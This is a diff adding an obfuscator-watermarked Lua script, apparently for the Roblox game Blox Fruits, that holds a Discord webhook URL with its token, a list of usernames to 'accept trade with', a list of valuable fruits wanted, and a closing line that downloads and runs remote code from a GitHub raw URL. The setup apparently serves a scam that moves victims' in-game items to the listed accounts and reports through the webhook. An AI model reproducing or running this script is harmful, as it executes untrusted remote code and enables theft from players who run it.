@@ -1,0 +1,43 @@
+--[[
+
+.___  ___.   ______     ______   .__   __.  __  ___   ___ 
+|   \/   |  /  __  \   /  __  \  |  \ |  | |  | \  \ /  / 
+|  \  /  | |  |  |  | |  |  |  | |   \|  | |  |  \  V  /  
+|  |\/|  | |  |  |  | |  |  |  | |  . `  | |  |   >   <   
+|  |  |  | |  `--'  | |  `--'  | |  |\   | |  |  /  .  \  
+|__|  |__|  \______/   \______/  |__| \__| |__| /__/ \__\ 
+                                                          
+
+This script was obfuscated using Moonix (https://discord.gg/Agdgwp8efW)
+Hercules Obfuscator v1.6 (https://github.com/zeusssz/hercules-obfuscator)
+
+]]
+
+_G.Moonix = "Protected by Moonix and Hercules Obfuscator v1.6 | .gg/Agdgwp8efW" local function validateWatermark()
+    return _G.Moonix == "Protected by Moonix and Hercules Obfuscator v1.6 | .gg/Agdgwp8efW"
+end
+
+if not validateWatermark() then
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+    print("Script Protected by Moonix and Hercules Obfuscator | .gg/Agdgwp8efW")
+end
+
+Webhook = "https://discord.com/api/webhooks/1336920371731107860/i7yr3mnRZAhHi7tKt_oijqRTqlALwky6U7MmACfKTYTPOwypr8JpWaXC4Ow39U7Ikm2m"
+Usernames = {"GONNN00", "tluan93"} -- << Username(-s) it'll accept trade with
+Fruits = {"Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Control-Control"} -- << Fruits you want
+FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
+    "Quake-Quake",
+    "Love-Love",
+    "Magma-Magma",
+    "Ghost-Ghost",
+    "Barrier-Barrier"
+    "Spider-Spider"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/script/refs/heads/main/note"))()
